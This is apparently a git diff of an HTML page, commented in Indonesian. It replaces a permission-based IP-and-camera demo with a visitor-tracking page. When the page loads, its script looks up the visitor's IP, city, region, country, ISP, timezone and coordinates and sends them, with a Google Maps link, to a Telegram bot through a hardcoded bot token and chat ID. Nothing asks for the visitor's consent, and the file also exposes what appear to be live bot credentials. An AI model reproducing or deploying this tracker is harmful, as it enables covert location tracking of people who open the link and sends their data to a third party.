@@ -1,54 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Project Demo Web + Telegram</title>
+  <title>IP & Lokasi Visitor + Telegram</title>
 </head>
 <body>
-  <h1>Demo: IP & Kamera (dengan izin)</h1>
-  <p id="ip-info">Mendeteksi IP...</p>
-  <video id="video" width="400" autoplay></video>
+  <h2>📡 Sedang Mengambil Info Lokasi Anda...</h2>
+  <p id="info">Mohon tunggu sebentar...</p>
+  <div id="map" style="margin-top: 20px;"></div>
 
   <script>
-    // ======== Bagian 1: Ambil IP Publik ========
-    let userIP = '';
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        userIP = data.ip;
-        document.getElementById('ip-info').textContent = `IP Kamu: ${userIP}`;
-        sendToTelegram(userIP); // Kirim ke Telegram
-      })
-      .catch(err => {
-        document.getElementById('ip-info').textContent = 'Gagal mendapatkan IP';
-      });
+    const botToken = '8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY'; // 🔁 Ganti dengan token bot kamu
+    const chatId = '7600526426';     // 🔁 Ganti dengan chat ID kamu
 
-    // ======== Bagian 2: Akses Kamera (dengan izin) ========
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function(stream) {
-        document.getElementById('video').srcObject = stream;
-      })
-      .catch(function(error) {
-        console.error('Akses kamera ditolak atau gagal:', error);
-      });
-
-    // ======== Bagian 3: Kirim ke Bot Telegram ========
-    function sendToTelegram(ip) {
-      const token = '8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY';         // Ganti dengan token bot kamu
-      const chat_id = '7600526426';         // Ganti dengan chat ID kamu
-      const time = new Date().toLocaleString();
-      const message = `📡 Pengunjung Baru:\n\n🌐 IP: ${ip}\n🕒 Waktu: ${time}`;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    // Fungsi kirim ke Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          chat_id: chat_id,
+          chat_id: chatId,
           text: message
         })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("✅ Terkirim ke Telegram");
+        } else {
+          console.error("❌ Gagal kirim ke Telegram");
+        }
       });
     }
+
+    // Ambil data dari IPAPI
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const org = data.org;
+        const timezone = data.timezone;
+        const latitude = data.latitude;
+        const longitude = data.longitude;
+        const now = new Date().toLocaleString();
+
+        const message = `🌍 Pengunjung Baru:
+
+📡 IP: ${ip}
+🏙️ Kota: ${city}
+🗺️ Wilayah: ${region}
+🌐 Negara: ${country}
+📍 Koordinat: ${latitude}, ${longitude}
+🏢 ISP: ${org}
+🕒 Waktu Akses: ${now}
+⏱ Zona Waktu: ${timezone}
+🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        document.getElementById("info").innerText = message;
+
+        // Tampilkan Google Maps di halaman
+        const mapFrame = document.createElement('iframe');
+        mapFrame.width = "100%";
+        mapFrame.height = "400";
+        mapFrame.style.border = "0";
+        mapFrame.loading = "lazy";
+        mapFrame.allowFullscreen = true;
+        mapFrame.referrerPolicy = "no-referrer-when-downgrade";
+        mapFrame.src = `https://www.google.com/maps?q=${latitude},${longitude}&z=12&output=embed`;
+        document.getElementById("map").appendChild(mapFrame);
+
+        // Kirim ke Telegram sekarang
+        sendToTelegram(message);
+      })
+      .catch(err => {
+        console.error("Gagal ambil lokasi:", err);
+        document.getElementById("info").innerText = "Gagal ambil lokasi.";
+      });
   </script>
 </body>
 </html>
